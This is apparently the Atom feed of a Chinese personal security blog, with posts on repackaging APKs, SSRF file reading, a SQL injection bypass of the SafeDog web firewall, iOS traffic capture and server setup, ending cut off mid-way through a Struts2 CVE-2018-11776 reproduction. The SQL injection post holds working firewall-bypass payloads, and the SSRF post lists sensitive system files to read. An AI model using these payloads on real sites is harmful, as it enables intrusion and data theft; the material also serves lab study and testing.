<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>h1tler&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.cuittk.cn/"/>
  <updated>2019-12-13T08:24:57.350Z</updated>
  <id>http://www.cuittk.cn/</id>
  
  <author>
    <name>h1tler</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>android渗透测试从0开始</title>
    <link href="http://www.cuittk.cn/2019/12/13/android%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%8E0%E5%BC%80%E5%A7%8B/"/>
    <id>http://www.cuittk.cn/2019/12/13/android渗透测试从0开始/</id>
    <published>2019-12-13T07:57:44.641Z</published>
    <updated>2019-12-13T08:24:57.350Z</updated>
    
    <content type="html"><![CDATA[<h2 id="android渗透测试从0开始"><a href="#android渗透测试从0开始" class="headerlink" title="android渗透测试从0开始"></a>android渗透测试从0开始</h2><h3 id="apktool安装与使用"><a href="#apktool安装与使用" class="headerlink" title="apktool安装与使用"></a>apktool安装与使用</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><h4 id="apktool反编译"><a href="#apktool反编译" class="headerlink" title="apktool反编译"></a>apktool反编译</h4><p><code>apktool d test.apk -o test</code>    反编译出代码到test文件夹<br>反编译报错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">I: Using Apktool 2.4.1 on xxx.apk</div><div class="line">I: Loading resource table...</div><div class="line">I: Decoding AndroidManifest.xml with resources...</div><div class="line">I: Loading resource table from file: C:\Users\Administrator\AppData\Local\apktool\framework\1.apk</div><div class="line">I: Regular manifest package...</div><div class="line">I: Decoding file-resources...</div><div class="line">I: Decoding values */* XMLs...</div><div class="line">I: Baksmaling classes.dex...</div><div class="line">I: Baksmaling classes2.dex...</div><div class="line">I: Baksmaling assets/A3AEECD8.dex...</div><div class="line">Exception in thread &quot;main&quot; org.jf.dexlib2.dexbacked.DexBackedDexFile$NotADexFile: Not a valid dex magic value: cf 77 4c c7 9b 21 01 cd</div><div class="line">        at org.jf.dexlib2.util.DexUtil.verifyDexHeader(DexUtil.java:93)</div><div class="line">        at org.jf.dexlib2.dexbacked.DexBackedDexFile.getVersion(DexBackedDexFile.java:111)</div><div class="line">        at org.jf.dexlib2.dexbacked.DexBackedDexFile.&lt;init&gt;(DexBackedDexFile.java:78)</div><div class="line">        at org.jf.dexlib2.dexbacked.DexBackedDexFile.&lt;init&gt;(DexBackedDexFile.java:138)</div><div class="line">        at org.jf.dexlib2.dexbacked.ZipDexContainer$1.getDexFile(ZipDexContainer.java:181)</div><div class="line">        at brut.androlib.src.SmaliDecoder.decode(SmaliDecoder.java:90)</div><div class="line">        at brut.androlib.src.SmaliDecoder.decode(SmaliDecoder.java:39)</div><div class="line">        at brut.androlib.Androlib.decodeSourcesSmali(Androlib.java:96)</div><div class="line">        at brut.androlib.ApkDecoder.decode(ApkDecoder.java:164)</div><div class="line">        at brut.apktool.Main.cmdDecode(Main.java:170)</div><div class="line">        at brut.apktool.Main.main(Main.java:76)</div><div class="line">Press any key to continue . . .</div></pre></td></tr></table></figure></p><p>解决办法：<br>增加 <code>d --only-main-classe</code> 即可<br><code>apktool d --only-main-classe test.apk -o test</code></p><h4 id="修改代码"><a href="#修改代码" class="headerlink" title="修改代码"></a>修改代码</h4><h4 id="apktool编译成apk"><a href="#apktool编译成apk" class="headerlink" title="apktool编译成apk"></a>apktool编译成apk</h4><p><code>apktool b test -o test2.apk</code></p><h3 id="apk签名"><a href="#apk签名" class="headerlink" title="apk签名"></a>apk签名</h3><h4 id="去除签名"><a href="#去除签名" class="headerlink" title="去除签名"></a>去除签名</h4><p>其实很简单，用WinRAR打开apk，找到META-INF文件夹，删除MANIFEST.MF之外的所有其他文件即可。</p><h4 id="生成keystore文件"><a href="#生成keystore文件" class="headerlink" title="生成keystore文件"></a>生成keystore文件</h4><p>首先，签名需要keystore文件，可以使用keytool工具生成，一般Java环境都带有keytool命令。<br>要使用管理员权限运行cmd，不然会报错。<br><code>cd C:\Program Files\Java\jdk1.8.0_231\bin</code><br><code>keytool -genkey -alias demo.keystore -keyalg RSA -validity 40000 -keystore demo.keystore</code><br>各个参数解释如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">-genkey 产生证书文件</div><div class="line">-alias 产生别名</div><div class="line">-keystore 指定密钥库的.keystore文件中</div><div class="line">-keyalg 指定密钥的算法,这里指定为RSA(非对称密钥算法)</div><div class="line">-validity 为证书有效天数，这里我们写的是40000天</div></pre></td></tr></table></figure></p><p><img src="http://img.cdn.cuittk.cn/0zi1vb1uxynidx1vmi7estznnr.png" alt=""></p><h4 id="jarsigner签名apk"><a href="#jarsigner签名apk" class="headerlink" title="jarsigner签名apk"></a>jarsigner签名apk</h4><p>jarsigner也存在于Java JDK的安装包当中，所以安装好了Java环境的话，可以直接在命令行使用。<br><code>jarsigner -verbose -keystore demo.keystore demo.apk demo.keystore</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">-verbose 指定生成详细输出</div><div class="line">-keystore 指定数字证书存储路径</div></pre></td></tr></table></figure></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://ibotpeaches.github.io/Apktool/install/" target="_blank" rel="external">apktool安装</a><br><a href="https://haozi.moe/2019/12/09/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8A%93%E5%8C%85%E7%A0%B4%E8%A7%A3/" target="_blank" rel="external">apktool反编译报错</a><br><a href="https://blog.csdn.net/s13383754499/article/details/84108475" target="_blank" rel="external">apk去掉签名</a><br><a href="https://blog.csdn.net/sxk874890728/article/details/80486223" target="_blank" rel="external">一步一步带你反编译apk，并教你修改smali和重新打包</a><br><a href="https://blog.csdn.net/dreamer2020/article/details/52761606" target="_blank" rel="external">apk签名教程</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;android渗透测试从0开始&quot;&gt;&lt;a href=&quot;#android渗透测试从0开始&quot; class=&quot;headerlink&quot; title=&quot;android渗透测试从0开始&quot;&gt;&lt;/a&gt;android渗透测试从0开始&lt;/h2&gt;&lt;h3 id=&quot;apktool安装与使用&quot;
      
    
    </summary>
    
      <category term="web安全" scheme="http://www.cuittk.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>ssrf之深度利用</title>
    <link href="http://www.cuittk.cn/2019/12/07/ssrf%E4%B9%8B%E6%B7%B1%E5%BA%A6%E5%88%A9%E7%94%A8/"/>
    <id>http://www.cuittk.cn/2019/12/07/ssrf之深度利用/</id>
    <published>2019-12-07T04:45:00.428Z</published>
    <updated>2019-12-07T04:56:24.254Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ssrf之深度利用"><a href="#ssrf之深度利用" class="headerlink" title="ssrf之深度利用"></a>ssrf之深度利用</h2><h3 id="file协议任意文件读取的深度利用"><a href="#file协议任意文件读取的深度利用" class="headerlink" title="file协议任意文件读取的深度利用"></a>file协议任意文件读取的深度利用</h3><h4 id="查看版本信息"><a href="#查看版本信息" class="headerlink" title="查看版本信息"></a>查看版本信息</h4><p>linux:<br>/proc/version<br>/etc/issue<br>/etc/redhat-release<br>/proc/cpuinfo<br>windows:</p><h4 id="查看网络环境"><a href="#查看网络环境" class="headerlink" title="查看网络环境"></a>查看网络环境</h4><p>/etc/hosts<br>/etc/sysconfig/network-scripts/ifcfg-eth0</p><h4 id="针对centos-6-5"><a href="#针对centos-6-5" class="headerlink" title="针对centos 6.5"></a>针对centos 6.5</h4><h5 id="查看web服务的配置信息"><a href="#查看web服务的配置信息" class="headerlink" title="查看web服务的配置信息"></a>查看web服务的配置信息</h5><p>/etc/httpd/conf/httpd.conf<br>/etc/rc.d/init.d/nginx<br>/etc/init.d/nginx<br>/etc/nginx/nginx.conf<br>/etc/profile    环境变量</p><h5 id="各种日志信息"><a href="#各种日志信息" class="headerlink" title="各种日志信息"></a>各种日志信息</h5><p>/var/log/wtmp    登录成功的记录</p><h5 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h5><p>/root/.bash_history        一般root目录没权限访问<br>/home/wwwroot/.bash_history</p><h3 id="dict协议的深度利用"><a href="#dict协议的深度利用" class="headerlink" title="dict协议的深度利用"></a>dict协议的深度利用</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ssrf之深度利用&quot;&gt;&lt;a href=&quot;#ssrf之深度利用&quot; class=&quot;headerlink&quot; title=&quot;ssrf之深度利用&quot;&gt;&lt;/a&gt;ssrf之深度利用&lt;/h2&gt;&lt;h3 id=&quot;file协议任意文件读取的深度利用&quot;&gt;&lt;a href=&quot;#file协议任意
      
    
    </summary>
    
      <category term="web安全" scheme="http://www.cuittk.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>绕过安全狗进行SQL注入-终极打狗棍法</title>
    <link href="http://www.cuittk.cn/2019/12/02/%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E8%BF%9B%E8%A1%8CSQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://www.cuittk.cn/2019/12/02/绕过安全狗进行SQL注入/</id>
    <published>2019-12-02T15:22:30.684Z</published>
    <updated>2019-12-02T16:59:00.659Z</updated>
    
    <content type="html"><![CDATA[<h2 id="绕过安全狗进行SQL注入-终极打狗棍法"><a href="#绕过安全狗进行SQL注入-终极打狗棍法" class="headerlink" title="绕过安全狗进行SQL注入-终极打狗棍法"></a>绕过安全狗进行SQL注入-终极打狗棍法</h2><p>都9102年了还在打狗</p><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>网站安全狗v4.0.2655<br>Apache/2.4.23<br>PHP/5.6<br>mysql 5.7</p><h3 id="常规的绕过-打狗棍法第一式"><a href="#常规的绕过-打狗棍法第一式" class="headerlink" title="常规的绕过-打狗棍法第一式"></a>常规的绕过-打狗棍法第一式</h3><p>and 1=1和and 1=2被拦截<br>Xor 1=1和Xor 1=2不拦截<br>if((1=1),1,2)和if((1=2),1,2)不拦截<br>使用<code>%26</code>即url编码的<code>&amp;</code>绕过：<code>%26%26 True</code>和<code>%26%26 False</code><br><img src="http://img.cdn.cuittk.cn/f4vlmh2m8syk3grhsi9r5k3boi.png" alt=""></p><p><img src="http://img.cdn.cuittk.cn/t1k9ph6v6m45npklipe2kbnr35.png" alt=""></p><p><img src="http://img.cdn.cuittk.cn/tv759nh3ewd8t6lgioszqeusai.png" alt=""></p><p><img src="http://img.cdn.cuittk.cn/ujf9w26n05cxfbymdizoaqw8qi.png" alt=""></p><h3 id="order-by-绕过-打狗棍法第二式"><a href="#order-by-绕过-打狗棍法第二式" class="headerlink" title="order by 绕过-打狗棍法第二式"></a>order by 绕过-打狗棍法第二式</h3><h4 id="尝试order内联注释绕过"><a href="#尝试order内联注释绕过" class="headerlink" title="尝试order内联注释绕过"></a>尝试order内联注释绕过</h4><p><code>/**//*!order*//**//*!by*//**//*!1*/</code><br><img src="http://img.cdn.cuittk.cn/vt3nr0uoquu6uoj695cbgim6rm.png" alt=""></p><p>哈哈，失败了，都9102年，还是有长进的嘛</p><h4 id="利用换行跳过注释进行绕过"><a href="#利用换行跳过注释进行绕过" class="headerlink" title="利用换行跳过注释进行绕过"></a>利用换行跳过注释进行绕过</h4><p><code>order%23a%0aby 3</code><br><code>%23</code>为#注释，<code>%0a</code>为回车符，意思是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">order#a</div><div class="line">by 3</div></pre></td></tr></table></figure></p><p>也有用<code>/**/</code>替换空格的：<code>/**/order/**/%23aaaa%0a/**/by/**/3</code><br><img src="http://img.cdn.cuittk.cn/jn6heck4khiu273ssew0mwuahs.png" alt=""><br><img src="http://img.cdn.cuittk.cn/rwlp0oqs9op6iy1985wsfxvx9l.png" alt=""><br>字段数为3</p><h3 id="union-select-绕过-打狗棍法第三式"><a href="#union-select-绕过-打狗棍法第三式" class="headerlink" title="union select 绕过-打狗棍法第三式"></a>union select 绕过-打狗棍法第三式</h3><p>同样是利用换行跳过注释进行绕过<br><code>id=1 %26%26False union%23a%0aselect 1,2,3</code><br><code>id=-1 union%23a%0aselect 1,2,3</code><br><img src="http://img.cdn.cuittk.cn/x74bwpdclgwg6jnd70tvo2qhby.png" alt=""><br>user()函数拦截绕过：<code>user%23a%0a()</code><br><code>id=-1 union%23a%0aselect user%23a%0a(),2,3</code><br><img src="http://img.cdn.cuittk.cn/5gs7vjjhjwoh6jy1kwacsg48zd.png" alt=""></p><p>但是会拦截其他的关键字：<code>version</code>等，显得有些鸡肋<br><img src="http://img.cdn.cuittk.cn/cmhepscfhlb1qrs5t76jzqk273.png" alt=""></p><h3 id="终极打狗棍法"><a href="#终极打狗棍法" class="headerlink" title="终极打狗棍法"></a>终极打狗棍法</h3><p>发现安全狗会把<code>/**/</code>之间的内容直接忽略掉，所以就很有意思了，例如如下链接id存在注入：<br><code>http://xxxx/index.php?id=1</code><br><code>http://xxxx/index.php?a=/*&amp;id=1 and 1=2 union select version(),2,3%23*/</code><br>想怎么注就怎么注<br><img src="http://img.cdn.cuittk.cn/d0nadn70ld817ws0cjv0knq74l.png" alt=""></p><p><strong>杀狗</strong></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://422926799.github.io/posts/aafbd292.html" target="_blank" rel="external">https://422926799.github.io/posts/aafbd292.html</a><br><a href="https://422926799.github.io/posts/9d8606fc.html" target="_blank" rel="external">https://422926799.github.io/posts/9d8606fc.html</a><br><a href="https://blog.csdn.net/he_and/article/details/81287008" target="_blank" rel="external">https://blog.csdn.net/he_and/article/details/81287008</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;绕过安全狗进行SQL注入-终极打狗棍法&quot;&gt;&lt;a href=&quot;#绕过安全狗进行SQL注入-终极打狗棍法&quot; class=&quot;headerlink&quot; title=&quot;绕过安全狗进行SQL注入-终极打狗棍法&quot;&gt;&lt;/a&gt;绕过安全狗进行SQL注入-终极打狗棍法&lt;/h2&gt;&lt;p&gt;都9
      
    
    </summary>
    
      <category term="web安全" scheme="http://www.cuittk.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>内网渗透</title>
    <link href="http://www.cuittk.cn/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <id>http://www.cuittk.cn/2019/11/21/内网渗透/</id>
    <published>2019-11-21T02:56:53.517Z</published>
    <updated>2019-12-02T15:21:43.782Z</updated>
    
    <content type="html"><![CDATA[<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><p>IPC，黄金票据，白银票据，ntlm relay，Ptt,Ptk</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;内网渗透&quot;&gt;&lt;a href=&quot;#内网渗透&quot; class=&quot;headerlink&quot; title=&quot;内网渗透&quot;&gt;&lt;/a&gt;内网渗透&lt;/h3&gt;&lt;p&gt;IPC，黄金票据，白银票据，ntlm relay，Ptt,Ptk&lt;/p&gt;

      
    
    </summary>
    
      <category term="web安全" scheme="http://www.cuittk.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Fiddler抓ios流量遇到的问题</title>
    <link href="http://www.cuittk.cn/2019/11/11/Fiddler%E6%8A%93ios%E6%B5%81%E9%87%8F%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <id>http://www.cuittk.cn/2019/11/11/Fiddler抓ios流量遇到的问题/</id>
    <published>2019-11-11T09:32:20.322Z</published>
    <updated>2019-11-11T09:59:07.429Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Fiddler抓ios流量遇到的问题"><a href="#Fiddler抓ios流量遇到的问题" class="headerlink" title="Fiddler抓ios流量遇到的问题"></a>Fiddler抓ios流量遇到的问题</h2><h3 id="PC上开启端口，启用https"><a href="#PC上开启端口，启用https" class="headerlink" title="PC上开启端口，启用https"></a>PC上开启端口，启用https</h3><p>启用https<br><img src="http://img.cdn.cuittk.cn/QQ%E5%9B%BE%E7%89%8720191111174039.png" alt=""><br>开启8888端口<br><img src="http://img.cdn.cuittk.cn/QQ%E6%88%AA%E5%9B%BE20191111174214.png" alt=""></p><h3 id="ios端下载证书"><a href="#ios端下载证书" class="headerlink" title="ios端下载证书"></a>ios端下载证书</h3><p>访问192.168.1.129:8888<br><img src="http://img.cdn.cuittk.cn/QQ%E6%88%AA%E5%9B%BE20191111174215.jpg" alt=""></p><h3 id="iso端信任证书"><a href="#iso端信任证书" class="headerlink" title="iso端信任证书"></a>iso端信任证书</h3><p>设置-&gt;通用-&gt;描述文件与设备管理。安装证书<br>出现报错信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">警告</div><div class="line">安装</div><div class="line">未受管理的根证书</div><div class="line">若安装证书“DO_ NOT. _TRUST FiddlerRoot&quot;，此证书将被添加到iPhone.上被信任的证书列表中。只有在“证书信任设置”中启用，网站才会信任此证书。</div><div class="line">未验证的描述文件</div><div class="line">不能验证“DO_ NOT_ _TRUST_ FiddlerRoot”的真实性。</div></pre></td></tr></table></figure></p><p><img src="http://img.cdn.cuittk.cn/QQ%E6%88%AA%E5%9B%BE20191111174216.png" alt=""><br>安装信任之后还需要添加证书信任。<br>在 设置-&gt;通用-&gt;关于本机-&gt;证书信任设置中启用完全信任。<br><img src="http://img.cdn.cuittk.cn/QQ%E6%88%AA%E5%9B%BE20191111174217.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Fiddler抓ios流量遇到的问题&quot;&gt;&lt;a href=&quot;#Fiddler抓ios流量遇到的问题&quot; class=&quot;headerlink&quot; title=&quot;Fiddler抓ios流量遇到的问题&quot;&gt;&lt;/a&gt;Fiddler抓ios流量遇到的问题&lt;/h2&gt;&lt;h3 id=&quot;P
      
    
    </summary>
    
      <category term="web安全" scheme="http://www.cuittk.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>使用ab压测工具</title>
    <link href="http://www.cuittk.cn/2019/01/09/%E4%BD%BF%E7%94%A8ab%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7/"/>
    <id>http://www.cuittk.cn/2019/01/09/使用ab压测工具/</id>
    <published>2019-01-09T12:17:50.436Z</published>
    <updated>2019-11-11T17:08:43.208Z</updated>
    
    <content type="html"><![CDATA[<h2 id="使用ab压测工具"><a href="#使用ab压测工具" class="headerlink" title="使用ab压测工具"></a>使用ab压测工具</h2><p>使用的操作系统：ubuntu14.04<br>更新源：<code>apt-get update</code><br><code>sudo apt-get install apache2-utils</code><br><code>ab -n 100 -c 10 www.baidu.com/index.html</code><br>ab -n 100 -c 10 www.baidu.com/index.php</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;使用ab压测工具&quot;&gt;&lt;a href=&quot;#使用ab压测工具&quot; class=&quot;headerlink&quot; title=&quot;使用ab压测工具&quot;&gt;&lt;/a&gt;使用ab压测工具&lt;/h2&gt;&lt;p&gt;使用的操作系统：ubuntu14.04&lt;br&gt;更新源：&lt;code&gt;apt-get updat
      
    
    </summary>
    
      <category term="开发" scheme="http://www.cuittk.cn/categories/%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>使用php 接入Spring Cloud微服务</title>
    <link href="http://www.cuittk.cn/2019/01/04/%E4%BD%BF%E7%94%A8php%20%E6%8E%A5%E5%85%A5Spring%20Cloud%E5%BE%AE%E6%9C%8D%E5%8A%A1/"/>
    <id>http://www.cuittk.cn/2019/01/04/使用php 接入Spring Cloud微服务/</id>
    <published>2019-01-04T15:06:14.888Z</published>
    <updated>2019-01-04T16:08:41.151Z</updated>
    
    <content type="html"><![CDATA[<h2 id="使用php-接入Spring-Cloud微服务"><a href="#使用php-接入Spring-Cloud微服务" class="headerlink" title="使用php 接入Spring Cloud微服务"></a>使用php 接入Spring Cloud微服务</h2><p>微服务很火，实验室要求大部分语言接入微服务，比如:.NET、JAVA、前端、PHP。微服务本来就是JAVA的，作为一个phper，只有想办法接入微服务。<br>网上可以参考的东西不多，但还是找到了可利用的东西。<br>先实现php注册到Spring Cloud的注册中心：<a href="http://eureka.springcloud.cn/" target="_blank" rel="external">http://eureka.springcloud.cn/</a></p><h3 id="把php应用部署到openresty-PHP（FPM）"><a href="#把php应用部署到openresty-PHP（FPM）" class="headerlink" title="把php应用部署到openresty + PHP（FPM）"></a>把php应用部署到openresty + PHP（FPM）</h3><p>注册工具SpringCloudOpenresty</p><h4 id="前提：安装openresty和php-7-0和FPM"><a href="#前提：安装openresty和php-7-0和FPM" class="headerlink" title="前提：安装openresty和php 7.0和FPM"></a>前提：安装openresty和php 7.0和FPM</h4><p>使用的系统：ubuntu14.04</p><h5 id="安装openresty"><a href="#安装openresty" class="headerlink" title="安装openresty"></a>安装openresty</h5><p>源码包下载：<a href="http://openresty.org/cn/download.html" target="_blank" rel="external">http://openresty.org/cn/download.html</a><br>找个目录放源码：cd /root<br><code>wegt https://openresty.org/download/openresty-1.13.6.2.tar.gz</code><br>相关依赖包的安装<br><code>apt-get install libreadline-dev libncurses5-dev libpcre3-dev libssl-dev perl make build-essential</code><br>解压源码，安装openresty<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">tar -xzvf openresty-1.13.6.2.tar.gz</div><div class="line">cd openresty-1.13.6.2</div><div class="line">./configure</div><div class="line">make &amp;&amp; make install</div></pre></td></tr></table></figure></p><p>验证安装成功<br><code>curl 127.0.0.1</code><br>返回一段html代码<br><img src="http://img.cdn.cuittk.cn/u439vuq7ls3e44269fg46hnz5m.png" alt=""></p><h5 id="安装php7-0"><a href="#安装php7-0" class="headerlink" title="安装php7.0"></a>安装php7.0</h5><p>前期准备<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># 更新 apt-get</div><div class="line">sudo apt-get update</div><div class="line"></div><div class="line"># 解决有可能存在的语言问题</div><div class="line">sudo apt-get install -y language-pack-en-base</div></pre></td></tr></table></figure></p><p>安装完成之后，运行：<br><code>locale-gen en_US.UTF-8</code><br>安装Php7.0，本教程采用ppa方式安装php7.0，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># 添加php的仓库</div><div class="line">sudo apt-get install software-properties-common</div><div class="line">#&gt; 中途按下回车</div><div class="line">sudo LC_ALL=en_US.UTF-8 add-apt-repository ppa:ondrej/php</div></pre></td></tr></table></figure></p><p>安装完成之后，运行<code>sudo apt-get update</code>更新安装包，把刚才添加的包拉取下来。 运行<code>apt-cache search php7.0</code>搜索php7.0开头的包检验是否安装成功，输出如下：<br><img src="http://img.cdn.cuittk.cn/m1h9vah8ltk2os85ulq8ttvs4i.png" alt=""><br>安装php7.0:<br><code>sudo apt-get -y install php7.0</code><br>安装成功后运行<code>php -v</code>查看是否安装成功，成功的话会输出类似如下信息：<br><img src="http://img.cdn.cuittk.cn/033oleh1itlqh4tezivfbc2pam.png" alt=""></p><h5 id="安装-fpm"><a href="#安装-fpm" class="headerlink" title="安装 fpm"></a>安装 fpm</h5><p><code>sudo apt-get install php7.0-fpm</code></p><h4 id="使用serviceRegistry工具"><a href="#使用serviceRegistry工具" class="headerlink" title="使用serviceRegistry工具"></a>使用serviceRegistry工具</h4><p>下载serviceRegistry到root目录下<br><a href="https://github.com/tangaiyun/SpringCloudOpenrestyPHP" target="_blank" rel="external">https://github.com/tangaiyun/SpringCloudOpenrestyPHP</a><br>对于Spring cloud：<br>1.将serviceRegistry/consul/lualib中的所有文件（包含目录）复制到你的openresty lualib目录中/usr/local/openresty/lualib<br><code>cp -r /root/serviceRegistry/eureka/lualib/* /usr/local/openresty/lualib</code><br>2.更改你的nginx.conf文件和serviceRegistry/consul/conf/nginx.conf一样，请注意块<br><code>cp -r /root/serviceRegistry/eureka/conf/* /usr/local/openresty/nginx/conf</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">init_worker_by_lua_block &#123;</div><div class="line">        if 0 == ngx.worker.id() then </div><div class="line">            local workservice = require &apos;eureka.workerservice&apos;</div><div class="line">            local filePath = &apos;/usr/local/openresty/nginx/conf/serviceInstance.json&apos;</div><div class="line">            eurekaHost = &apos;10.100.23.69&apos;</div><div class="line">            eurekaPort = 8761</div><div class="line">    local file1 = io.input(filePath)</div><div class="line">        </div><div class="line">...</div></pre></td></tr></table></figure></p><p>可将“filePath”更改为您自己的服务配置位置。<br>eurekaHost填写注册中心ip或者域名。比如Spring Cloud的注册中心：<code>eureka.springcloud.cn</code><br>eurekaPort填写注册中心的端口。比如Spring Cloud的注册中心端口：<code>80</code><br>3.将serviceInstance.json更改为你的环境，例如：<br><code>/usr/local/openresty/nginx/conf/serviceInstance.json</code>中的ip改为自己环境的ip，比如192.168.211.22<br>4.将serviceRegistry/eureka/html中的文件复制到你的Web根目录。<br><code>cp -r /root/serviceRegistry/eureka/html/* /usr/local/openresty/nginx/html</code></p><h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><p>Openresty nginx服务命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">/usr/local/openresty/nginx/sbin/nginx #启动</div><div class="line">/usr/local/openresty/nginx/sbin/nginx -s stop #停止</div><div class="line">/usr/local/openresty/nginx/sbin/nginx -s reload #重启</div></pre></td></tr></table></figure></p><p>启动php7.0-fpm服务<br><code>service php7.0-fpm start</code><br>开启openresty以及php7.0-fpm，可以发现在注册中心已经注册成功。<br><img src="http://img.cdn.cuittk.cn/hqdsgu3mr6bt91zq0o6vuzwljt.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;使用php-接入Spring-Cloud微服务&quot;&gt;&lt;a href=&quot;#使用php-接入Spring-Cloud微服务&quot; class=&quot;headerlink&quot; title=&quot;使用php 接入Spring Cloud微服务&quot;&gt;&lt;/a&gt;使用php 接入Spring Cl
      
    
    </summary>
    
      <category term="开发" scheme="http://www.cuittk.cn/categories/%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2018-11776漏洞从搭建到复现</title>
    <link href="http://www.cuittk.cn/2019/01/02/CVE-2018-11776%E6%BC%8F%E6%B4%9E%E4%BB%8E%E6%90%AD%E5%BB%BA%E5%88%B0%E5%A4%8D%E7%8E%B0/"/>
    <id>http://www.cuittk.cn/2019/01/02/CVE-2018-11776漏洞从搭建到复现/</id>
    <published>2019-01-02T12:23:13.189Z</published>
    <updated>2019-01-02T15:37:35.941Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Struts2-057-CVE-2018-11776-漏洞从搭建到复现"><a href="#Struts2-057-CVE-2018-11776-漏洞从搭建到复现" class="headerlink" title="Struts2-057(CVE-2018-11776)漏洞从搭建到复现"></a>Struts2-057(CVE-2018-11776)漏洞从搭建到复现</h2><p>村里刚通网，出来这么久了才做复现。</p><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>2018年8月23日，ApacheStrust2发布最新安全公告，ApacheStruts2 存在远程代码执行的高危漏洞，该漏洞由SemmleSecurity Researchteam的安全研究员汇报，漏洞编号为CVE-2018-11776（S2-057）。</p><p>定义XML配置时如果namespace值未设置且上层动作配置（Action Configuration）中未设置或用通配符namespace时可能会导致远程代码执行。<br>url标签未设置value和action值且上层动作未设置或用通配符namespace时可能会导致远程代码执行。</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>受影响版本<br>Struts2.3 – 2.3.34<br>Struts2.5 – 2.5.16</p><p>不受影响版本<br>Struts 2.3.35<br>Struts 2.5.17</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>复现环境：<br>windows 7<br>jdk1.8.0_91<br>apache-tomcat-7.0.92<br>struts-2.3.34<br>环境搭建：<br>先安装jdk环境，配置java环境变量。<br>下载apache-tomcat-7.0.92，下载地址：<a href="https://tomcat.apache.org/download-70.cgi" target="_blank" 